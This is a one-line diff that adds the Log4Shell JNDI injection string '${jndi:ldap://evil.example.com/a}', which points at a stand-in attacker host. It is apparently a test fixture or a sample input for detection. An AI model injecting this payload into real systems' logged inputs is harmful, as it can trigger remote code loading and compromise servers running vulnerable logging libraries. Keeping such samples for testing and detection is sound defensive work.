@@ -1,0 +1,1 @@
+${jndi:ldap://evil.example.com/a}
